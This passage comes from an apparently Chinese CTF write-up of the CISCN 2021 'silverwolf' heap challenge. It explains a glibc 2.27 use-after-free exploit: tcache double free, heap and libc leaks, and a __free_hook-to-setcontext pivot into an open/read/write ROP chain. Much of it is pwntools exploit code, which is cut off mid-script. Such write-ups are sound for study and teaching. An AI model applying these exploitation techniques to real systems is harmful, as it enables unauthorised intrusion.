class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf((__int64)&amp;unk_1144, (__int64)&amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; heap_list )</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: %s</span></span><br><span class="line"><span class="string">&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)heap_list);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p>存在很明显的UAF漏洞，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf((__int64)&amp;unk_1144, (__int64)&amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; heap_list )</span><br><span class="line">    <span class="built_in">free</span>(heap_list);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>目前已知有UAF漏洞，并且题目是Glibc2.27的，所以存在tcache bin，并且需要打ORW，其实在这之前我并没有打过堆上的ORW,现在进行尝试，首先我们肯定需要泄漏libc地址，而一般利用unshorbin的chunk，因为ub的fd和bk都是指向main_anera+一个偏移的地址，但是现在只能申请小于等于0x78大小的chunk，那么现在的问题就是怎么申请到非fasrbin的chunk,而我们是处于Glibc2.27的环境下，而tcache bin会申请一个很大的chunk，用于管理tcache bin里面的chunk,这个大的chunk在Glibc2.27大小是0x251，而由于开启了沙盒，导致会有很多杂乱的chunk，如图</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/start_bins.png" class><p>那么现在如果我们能够把这个chunk  free掉，不就可以使得它进ub，从而得到libc_addr嘛？，因此我们现在需要得到得到chunk的地址，那么怎么得到呢？在Glibc2.27针对tcache bin引入了key这个用于检测double free的机制，当一个chunk被free掉，进入tcache bin的时候，会把这个地址写入到chunk_addr+8的位置，因此，利用这个机制，我们可以泄漏得到heap_addr,</p><h3 id="leak-heap-addr"><a href="#leak-heap-addr" class="headerlink" title="leak_heap_addr"></a>leak_heap_addr</h3><p>那么好，现在先来处理泄漏heap_addr的问题，那么现在的问题是：这个key会检测double free,如果不能double free，那么我们目前无法将free掉的这个tcache chunk的fd修改为处于头部的0x251的chunk,那么就无法通过ub泄漏地址，所以我们需要把这个key覆盖掉，随便覆盖成什么，因为地址后面第二次free的时候会重新覆盖上，那么好，来看变化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x78</span>)</span><br><span class="line">        edit(<span class="string">b&#x27;source&#x27;</span>)</span><br><span class="line">    edit(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    delete()</span><br><span class="line">    edit(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    bug()   </span><br><span class="line">exp()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/leak_heap_first.png" class><p>这里是存在问题的，这里直接show是得不到这个地址的，因为前面是0，会被 __printf_chk截断掉，所以必须double free</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/leak_heap_second.png" class><p>好了，现在我们就可以double free,并且泄漏地址了，</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/leak_heap_thire.png" class><p>拿到地址，为了简约，将代码修改成这样，并且将泄漏的地址低三位取0，这样得到堆的基地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="comment"># ========== Exploit 开始 ==========</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x78</span>)</span><br><span class="line">        edit(<span class="string">b&#x27;source&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        edit(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">        delete()</span><br><span class="line">    show()</span><br><span class="line">    ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    heap_addr = uu64(ru(<span class="string">b&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>,drop=<span class="literal">True</span>))&amp;<span class="number">0xffffffffff000</span> </span><br><span class="line">    leak(<span class="string">&quot;heap_addr&quot;</span>,heap_addr)</span><br><span class="line">    bug()   </span><br><span class="line">exp()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/leak_heap_addr.png" class><h3 id="修改fd为tcache的大chunk"><a href="#修改fd为tcache的大chunk" class="headerlink" title="修改fd为tcache的大chunk"></a>修改fd为tcache的大chunk</h3><p>因为已经double free，并且存在uaf我可以去修改chunk的fd为tcache,进而让我们能够拿到libc的地址，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br></pre></td></tr></table></figure><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/change_to_tb_f.png" class><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/change_to_tb_d.png" class><h3 id="修改这个chunk，并且free，泄漏libc"><a href="#修改这个chunk，并且free，泄漏libc" class="headerlink" title="修改这个chunk，并且free，泄漏libc"></a>修改这个chunk，并且free，泄漏libc</h3><p>现在这里需要将tcache bin的机制来复习 <del>学习</del> </p><p>tcache bin其实是依靠最开始申请的这个大的chunk来控制的，前面一部分是count部分，就是用来管理chunk的数量的，也就是tcache_perthread_struct里面的counts部分，其实tcache_puts和tcache_gets就是依照这个counts来确定tcachebin里面是否存在chunk的，如果说我们把这个覆盖成7，那么再次释放对应大小的chunk就不会进入tcachebin，直接进入unshortbin或者fastbin，其中每个counts所占字节大小其实不是固定的，会随着版本的变化而变化，最好的解决办法是看源码，或者，直接调试，那么接下来是调试的办法，<em>这里是另一个题目的，不是这道题的，只是举一个例子</em></p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/counts_size_test1.png" class><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/counts_size_test2.png" class><p>所以这里counts的大小就是两个字节</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/counts_size_test3.png" class><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/counts_size_test4.png" class><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/counts_size_test5.png" class><p>这样就是对应的距离了，</p><p>好了，既然了解了这部分counts的知识，现在我们是在这个0x251的chunk上，那么现在找到0x250的位置，并且将对应的部分覆盖为7，并且free掉这个chunk使其进入ub，从而泄漏地址</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/leak_libc1.png" class><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/leak_libc2.png" class><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="string">b&#x27;&#x27;</span>*<span class="number">0x23</span>+<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">libc_base = l64()-<span class="number">0x3ebca0</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br></pre></td></tr></table></figure><p>这里的libc_base可以直接硬编码计算，也可以使用其他方法，比如减去libc.sym.main_anera</p><h3 id="接下来就要考虑ORW了"><a href="#接下来就要考虑ORW了" class="headerlink" title="接下来就要考虑ORW了"></a>接下来就要考虑ORW了</h3><p>因为开启了沙箱，很明显，只想让我们打ORW,</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">❯ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>首先让我们回想一下在栈上打ORW的时候是什么样子的，要么构造ROP，要么写shellcode,而在堆上是没有办法直接在堆内存上执行代码的，现在就要引申一个概念，就是栈迁移是为了什么，栈迁移是不是实际上就是通过rbp去控制rsp，这样就把rsp迁移到任意位置，这样的话栈也就被迁移到其他地方了,接下来只要这个地方存在ROP，就可以直接执行，因为ROP的gadget在text段上，可以直接执行，那么这是在栈上，一般也会迁移到.bss段上，但是在堆上呢？应该怎么做？</p><p>而在Glibc中有这么一个函数，setcontext，而这个函数又以2.27,2.29为分界，在这里不详细说明，下面是这个函数在2.27的样子，</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/setcontext.png" class><p>主要注意这部分，可以看到是使用rdi来控制所有通用寄存器的值，但是这里不重要，重要的是，这里会通过rdi+0xa0的地址给rsp,sp是栈顶指针，也就是rsp往下，都会被认为是栈，这样的话不就可以控制rsp去执行ROP—–ORW了嘛，那么我们现在需要考虑怎么布置这个伪造的栈帧了，其实如果想执行到这里，那么我们也许需要借助hook函数，</p><p>首先这里是通过rdi来控制的，所以rdi一定得是堆上的某个地址，因为我们需要在堆上执行ORW,</p><p>那么我们应该怎么布置这些呢？,如下，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pay = <span class="string">b&#x27;&#x27;</span>*<span class="number">0x40</span>+p64(libc_base+libc.sym.__free_hook)+p64(<span class="number">0</span>)</span><br><span class="line">  pay += p64(heap_addr+<span class="number">0x1000</span>)    <span class="comment"># flag_addr heap:0x40</span></span><br><span class="line">  pay += p64(heap_addr+<span class="number">0x2000</span>)    <span class="comment"># fake_chunk heap:0x50</span></span><br><span class="line">  pay += p64(heap_addr+<span class="number">0x20a0</span>)    <span class="comment"># stack 2 heap:0x60</span></span><br><span class="line">  pay += p64(heap_addr+<span class="number">0x3000</span>)    <span class="comment"># orw1 heap:0x70</span></span><br><span class="line">  pay += p64(heap_addr+<span class="number">0x3060</span>)    <span class="comment"># orw2 heap:0x80 continue orw1</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>现在的我们还处于tcache bin 的这个巨大的结构体堆里面，这个时候我们还是可以通过这个结构体来布置chunk的，首先把前面的counts填一下，随便填一点，然后就是free_hook,从这里开始是tcache bin里面每一个chunk队列的头的地址对应的chunk的地址，也就是tcache_entry-&gt;*next，<del>我在说什么呢？</del>,其实就是chunk队列的头，链接的chunk，就比如：0x20：chunk1–&gt;chunk2，这里我所讲的就是chunk1</p><p>那么按照这样布置，就会使得对应size的chunk地址为我们所布置的，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x20</span>--&gt;free_hook；<span class="number">0x30</span>用不上，所以随意覆盖；</span><br><span class="line"><span class="number">0x40</span>--&gt;heap_addr+<span class="number">0x1000</span>；<span class="number">0x50</span>--&gt;heap_addr+<span class="number">0x2000</span>；</span><br><span class="line"><span class="number">0x60</span>--&gt;heap_addr+<span class="number">0x20a0</span>；<span class="number">0x70</span> --&gt;heap_addr+<span class="number">0x3000</span> ; </span><br><span class="line"><span class="number">0x80</span> --&gt;heap_addr+<span class="number">0x3060</span></span><br></pre></td></tr></table></figure><p>那么现在，只要申请对应size大小就可以控制对应的内存了，至于这里的chunk的地址为什么是这样的，我一个一个的解释，</p><p>还记得上面说过的，需要把rsp控制到堆上吗？而在Glibc2.27里面setcontext是使用rdi去控制的，（注；2.29貌似是rdx控制的），所以我们需要控制rdi,而free_hook在释放chunk的时候，rdi里面的值，刚好会是你free的那个堆块的地址，那么这样不就可以把rdi控制为我们指定的chunk的地址吗？接下来0x40~0x80这几个chunk的作用，也许你们就知道是什么了，其中0x70和0x80是为了布置ORW读取flag的fake_stack，因为ROP链太长了，导致一个chunk的空间不够，所以需要两个相邻的chunk来拼接，然后0x40的chunk是为了读”flag”这个字符串，并且可以把flag的内容读在上面，</p><p>注意接下来的操作：首先把tcache bin里面的0x20的chunk申请出来，并且修改为setcontext+53的位置，(因为setcontext+53的位置是mov rsp,[rsi+0xa0])，这样下次执行free的时候就会直接跳到setcontext+53的位置，从而将rsp移动到对应的位置，那么这里是第一步，接下来我们需要干啥呢？第二步，我们需要构造一下，我们需要把0x60这个chunk的内容上放上heap+0x3000也就是ORW的地址，那么现在，我们如果把0x50那个chunk释放掉，就会使得rdi &#x3D;&#x3D; chunk_size_0x50 <del>表意写法，不要在意</del>，并且同时触发setcontext,将rdi+0xa0地方的内容给rsp，这里rdi+0xa0的地方其实就是heap_base+0x2000+a0 &#x3D;&#x3D;&#x3D;&#x3D;&gt; heap_base+0x20a0，那么这个地方的值是什么呢？那不就是我们前面的heap_base+0x3000吗？那么不就把rsp放当orw上来了吗？这样就可以在执行完setcontext之后执行ORW了，但是需要注意的是在修改0x60这个chunk的内容为heap_base+0x3000的时候，后面还需要加一个ret，因为setcontext里面有一个push,为了平衡，需要ret弄回来，</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/setcontext1.png" class><p>并且在构造ORW的时候，需要注意open要使用syscall的方式构造不可以直接调用，要用syscall，这是因为在2.27里，open函数开始的位置会影响栈布局，具体如下:</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/open.png" class><p>而read和write就不会</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/read_and_wrote.png" class><h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程/本地切换</span></span><br><span class="line"><span class="keyword">if</span> args.get(<span class="string">&quot;REMOTE&quot;</span>):</span><br><span class="line">    io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28172</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ELF加载</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 常用函数定义 ==========</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               : io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        : io.sendafter(<span class="built_in">str</span>(delim), data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               : io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        : io.sendlineafter(<span class="built_in">str</span>(delim), data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           : io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    : io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">False</span> : io.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    : io.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         : log.success(<span class="string">&#x27;&#123;&#125; ======== &gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">p       = <span class="keyword">lambda</span> name,data          : <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; ======== &gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name,data))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 常用泄露函数 ==========</span></span><br><span class="line">l64     = <span class="keyword">lambda</span>                    : u64(io.recvuntil(<span class="string">b&quot;&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;&quot;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    : u32(io.recvuntil(<span class="string">b&quot;�&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;&quot;</span>))</span><br><span class="line">l64_no  = <span class="keyword">lambda</span>                    : u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">  gdb.attach(io)</span><br><span class="line">  pause()</span><br><span class="line"><span class="comment"># [+] ========= Some funtion ========= [+]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    sla(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    sla(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># ========== Exploit 开始 ==========</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x78</span>)</span><br><span class="line">        edit(<span class="string">b&#x27;source&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        edit(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">        delete()</span><br><span class="line">    show()</span><br><span class="line">    ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    heap_addr = uu64(ru(<span class="string">b&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>,drop=<span class="literal">True</span>))&amp;<span class="number">0xffffffffff000</span></span><br><span class="line">    leak(<span class="string">&quot;heap_addr&quot;</span>,heap_addr)</span><br><span class="line">    edit(p64(heap_addr+<span class="number">0x10</span>)) </span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="string">b&#x27;&#x27;</span>*<span class="number">0x23</span>+<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    delete()</span><br><span class="line">    show()</span><br><span class="line"></span><br><span class="line">    libc_base = l64()-<span class="number">0x3ebca0</span></span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">    bug()   </span><br><span class="line">    <span class="comment"># [+] ========= change stuck from tcache ========= [+]</span></span><br><span class="line">    pay = <span class="string">b&#x27;&#x27;</span>*<span class="number">0x40</span>+p64(libc_base+libc.sym.__free_hook)+p64(<span class="number">0</span>)</span><br><span class="line">    pay += p64(heap_addr+<span class="number">0x1000</span>)    <span class="comment"># flag_addr heap:0x40</span></span><br><span class="line">    pay += p64(heap_addr+<span class="number">0x2000</span>)    <span class="comment"># fake_chunk heap:0x50</span></span><br><span class="line">    pay += p64(heap_addr+<span class="number">0x20a0</span>)    <span class="comment"># stack 2 heap:0x60</span></span><br><span class="line">    pay += p64(heap_addr+<span class="number">0x3000</span>)    <span class="comment"># orw1 heap:0x70</span></span><br><span class="line">    pay += p64(heap_addr+<span class="number">0x3060</span>)    <span class="comment"># orw2 heap:0x80 continue orw1</span></span><br><span class="line">    edit(pay)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># [+] ====== Some addr ======= [+]</span></span><br><span class="line">    rax = libc_base+<span class="number">0x000000000001b500</span></span><br><span class="line">    rdi = libc_base+<span class="number">0x000000000002164f</span></span><br><span class="line">    rsi = libc_base+<span class="number">0x0000000000023a6a</span></span><br><span class="line">    rdx = libc_base+<span class="number">0x0000000000001b96</span></span><br><span class="line">    ret = libc_base+<span class="number">0x00000000000008aa</span></span><br><span class="line">    syscall = libc_base+libc.sym.read+<span class="number">15</span></span><br><span class="line">    leave_ret = libc_base+<span class="number">0x00000000000547e3</span></span><br><span class="line"></span><br><span class="line">    setcontext = 